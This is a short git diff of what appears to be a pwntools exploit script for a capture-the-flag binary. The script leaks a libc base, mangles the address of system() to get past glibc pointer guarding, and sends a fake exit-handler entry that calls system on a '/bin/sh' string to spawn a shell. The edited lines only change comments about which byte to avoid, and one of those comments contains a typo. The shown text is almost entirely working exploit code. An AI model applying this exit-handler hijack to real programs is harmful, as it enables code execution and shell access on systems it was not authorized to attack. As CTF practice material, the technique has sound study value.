@@ -10,8 +10,9 @@ libc = ELF('./libc.so.6')
 
 def mangle(addr):
     # since system's offset is 0000000000055410. (objdump -T libc.so.6 | grep system)
-    # 0x10 means '\n'
-    # so plus 1 to avoid '\n'
+    # left shit will become 0xxxxxxxxxxx200000 
+    # 0x20 means ' '
+    # so plus 1 to avoid ' '
     addr += 1
     # fs:0x30 is zero, all we need is left shift 0x11
     return (addr<<0x11)&(2**64 - 1)
@@ -33,7 +34,6 @@ print("libc_base @ ", hex(libc_base))
 system = libc_base + libc.symbols['system']
 sh = libc_base + 0x1b75aa 
 __exit_funcs = libc_base + 0x1eb718
-
 
 payload = flat(0, 1, 4, mangle(system), sh) # fake exit_fn
 r.sendlineafter('?', b'Yes'.ljust(8, b'\x00')+payload)
